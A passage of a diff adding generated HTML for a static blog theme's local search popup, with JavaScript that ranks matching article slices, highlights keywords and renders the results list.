+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
